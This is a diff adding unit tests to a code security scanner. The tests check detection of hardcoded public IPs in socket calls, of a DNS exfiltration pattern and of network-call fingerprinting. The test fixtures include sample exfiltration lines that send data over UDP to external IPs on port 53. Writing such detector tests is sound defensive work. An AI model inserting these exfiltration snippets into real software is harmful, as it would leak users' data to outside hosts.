@@ -514,3 +514,67 @@ def test_no_compound_escalation_without_behavioral():
     obs = analyze_source(content, "util.py", FileClassification.SOURCE)
     compound = [o for o in obs if o.category == "compound:credential_theft_with_evasion"]
     assert compound == []
+
+
+# -- Socket IP detection --
+
+def test_detect_socket_ip_tuple():
+    """Public IP in socket call like ('1.2.3.4', 53) should be flagged."""
+    content = 'sock.sendto(data, ("15.204.59.61", 53))'
+    obs = detect_suspicious_imports(content, "exfil.py")
+    assert any(o.category == "import:hardcoded_ip" and "socket" in o.tags for o in obs)
+
+
+def test_socket_ip_localhost_not_flagged():
+    """Localhost IPs in socket calls are benign."""
+    content = 'sock.sendto(data, ("127.0.0.1", 8080))'
+    obs = detect_suspicious_imports(content, "server.py")
+    assert not any("socket" in o.tags for o in obs)
+
+
+def test_socket_ip_in_test_not_flagged():
+    """Socket IPs in test files should not be flagged."""
+    content = 'sock.sendto(data, ("93.184.216.34", 53))'
+    obs = detect_suspicious_imports(content, "tests/test_net.py")
+    assert not any("socket" in o.tags for o in obs)
+
+
+# -- DNS exfiltration pattern --
+
+def test_detect_dns_exfil_pattern():
+    """struct.pack + SOCK_DGRAM + sendto = DNS exfiltration."""
+    content = '''
+import socket, struct
+hdr = struct.pack(">HHHHHH", 0x0001, 0x0100, 1, 0, 0, 0)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(hdr + query, ("1.2.3.4", 53))
+'''
+    obs = detect_behavioral_patterns(content, "cache.py")
+    assert any(o.category == "behavioral:dns_exfiltration" for o in obs)
+
+
+def test_no_dns_exfil_without_sendto():
+    """struct.pack + SOCK_DGRAM but no sendto should not trigger."""
+    content = '''
+import socket, struct
+hdr = struct.pack(">HH", 1, 2)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+data = sock.recv(1024)
+'''
+    obs = detect_behavioral_patterns(content, "listener.py")
+    assert not any(o.category == "behavioral:dns_exfiltration" for o in obs)
+
+
+# -- Sendto in fingerprint network detection --
+
+def test_sendto_triggers_network_calls():
+    """socket.sendto should be detected as a network call in fingerprint."""
+    from security_scanner.semantic_fingerprint import compute_fingerprint
+    content = '''
+import socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(data, ("1.2.3.4", 53))
+'''
+    fp = compute_fingerprint(content, "exfil.py")
+    assert fp.makes_network_calls is True
+    assert "network_calls" in fp.capability_set()
